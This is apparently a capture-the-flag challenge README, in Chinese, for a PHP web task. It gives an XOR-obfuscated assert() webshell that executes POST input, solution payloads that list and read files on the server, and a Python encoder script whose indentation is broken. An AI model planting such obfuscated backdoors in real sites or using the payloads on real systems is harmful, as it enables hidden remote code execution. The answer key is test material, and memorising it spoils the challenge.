# Helen_of_Troy
* 题目简介：我看不懂，但我大受震撼。
* HINT：简单的assert()后门。
* 解法：通过写脚本的方式解出加密后的语句` assert($_POST[2sC7F]);`，再利用assert()查找根目录下的文件` 2sC7F=print_r(scandir('/','r'))`，最后再读取flag文件` 2sC7F=readfile('/flagXXXXX','r')`
* PS：HINT在比赛进行到一半后仍较少人做出该题放出。该题特性仅在PHP7.1以前的PHP版本可行，PHP7.1后assert不再支持代码执行，详见https://www.php.net/manual/zh/function.assert.php。
* 源码：
  ```php
    <?php
    $_=('!'^'@').('!'^'R').('!'^'R').('!'^'D').('!'^'S').('!'^'U'); // $_='assert';
    $__='_'.('!'^'q').('!'^'n').('!'^'r').('!'^'u'); // $__='_POST';
    $___=$$__;
    $____=('@'^'r').('!'^'R').('!'^'b').('@'^'w').('!'^'g');//$____='2sC7F';
    $_($___[$____]); // assert($_POST[2sC7F]);
    ?>X
  ```
  ```python
    #该脚本用于生成密文，解密脚本请自行编写
    #可打印ascii(33-126)
    import random
    #a,b,word[33-126]
    #chr():ascii转字符
    #ord():字符转ascii
    def wordMaker(word):
    for i in range (33,126):
        for j in range (33,126):
            if(chr(i^j)==word):
                print("('"+chr(i)+"'^'"+chr(j)+"')")
                return
    print("no such word"+word)
    all="2sC7F"#要加密的字符串
    for i in range(0,len(all)):
    wordMaker(list(all)[i])
  ```
* 考点：PHP异或、assert()代码执行
* 环境搭建：运行`build_docker.sh` 一键搭建。flag为静态，生成后会在根目录下。`entrypoint.sh`脚本会随机修改flag文件的名字，名字为flagXXXXX，默认映射端口为1337，请酌情修改脚本。